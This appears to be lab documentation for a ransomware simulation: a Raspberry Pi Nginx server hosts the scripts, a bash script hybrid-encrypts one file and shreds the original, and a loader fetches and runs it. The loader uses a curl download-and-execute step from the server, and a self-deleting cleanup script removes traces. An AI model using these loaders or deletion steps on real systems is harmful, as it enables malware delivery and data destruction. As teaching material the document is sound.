Fake Ransomware Simulation – Documentation
Overview
This project simulates the behavior of a simple ransomware attack in a controlled lab environment.
The goal is to understand how such attacks work from a technical perspective.
The project includes:
    • A local web server used to distribute scripts and keys
    • A ransomware simulation script that encrypts a file
    • A loader script that downloads and executes the ransomware
    • Logging of important actions
This project was created for educational purposes only.

1. Setting up a Local Web Server for File Transfer
1.1 Install the Operating System on a Raspberry Pi
The Raspberry Pi is used as a simple server to host the scripts and encryption keys.
Steps:
    1. Use the Raspberry Pi Imager to install the operating system.
    2. Enable SSH access:
        ◦ Create an empty file named ssh in the boot directory.
    3. Create a file named userconf.txt in the boot directory that contains:
        ◦ a username
        ◦ a hashed password
This ensures that SSH access is available after the first boot.

1.2 Connect via SSH
After booting the Raspberry Pi, connect using SSH:
ssh user@ipaddress
Enter the correct password when prompted.

1.3 Install Nginx
Update the system and install the web server:
sudo apt update
sudo apt install nginx

1.4 Configure the Website for File Downloads
Open the Nginx configuration file:
/etc/nginx/sites-available/default
Inside the server block, add the following configuration:
location /downloads/ {
    alias /var/www/html/downloads/;
    add_header Content-Disposition "attachment";
    default_type application/octet-stream;
}
Create the directory used for downloads:
/var/www/html/downloads
Place the files that should be downloadable into this directory.
They will then be accessible via:
http://server-ip/downloads/filename
Reload Nginx to apply the configuration:
sudo systemctl reload nginx

2. Writing the Encryption Script
The ransomware simulation script performs several actions:
    1. Download a public key
    2. Generate a symmetric encryption key
    3. Encrypt a target file
    4. Encrypt the symmetric key with the public key
    5. Delete the original file
    6. Download and execute a self-destruction script

2.1 Define the Target File
The target file is identified using the find command:
target=$(find ~/ -name "Get_Crypt.txt")
This variable stores the path of the file that will be encrypted.

2.2 Encrypt the Target File
The script uses hybrid encryption:
    1. A symmetric AES key encrypts the file.
    2. The AES key itself is encrypted with a public key.
This approach is commonly used because symmetric encryption is fast for large files, while asymmetric encryption is used to securely protect the key.

2.3 Remove the Original File
After encryption, the original file is securely deleted using:
sudo shred -u "$target"
This overwrites the file before deleting it to make recovery more difficult.

2.4 Download and Execute a Self-Destruction Script
The ransomware simulation downloads another script that deletes the ransomware itself.
Steps performed:
    1. Download the script using curl
    2. Make the script executable
    3. Execute it
This simulates malware attempting to remove traces of itself.

3. Loader Script – Download and Execute the Ransomware
A separate loader script is used to download and execute the ransomware script from the web server.
3.1 Ensure Curl Is Installed
sudo apt-get install curl

3.2 Download the Script
sudo curl --remote-name serverip/downloads/ransomware.sh

3.3 Give Execution Permission
sudo chmod +x ransomware.sh

3.4 Execute the Script
./ransomware.sh

4. Logging
All scripts write log entries to a log file.
4.1 Log Function
A reusable logging function is implemented in the scripts.
It records:
    • Timestamp
    • Username
    • Script name
    • Log level (INFO or ERROR)
    • Message
Example structure:
date | script | level | user | message

4.2 Logging Important Operations
Log entries are created for important events such as:
    • Script start and end
    • File downloads
    • Encryption operations
    • Script execution
    • Errors
This makes it possible to trace the execution of the simulated attack.

Educational Disclaimer
This project is a ransomware simulation created for educational cybersecurity purposes only.
It is intended to demonstrate:
    • how ransomware attacks operate
    • how encryption is used
    • how scripts can automate attack steps
The project was developed in a controlled lab environment.
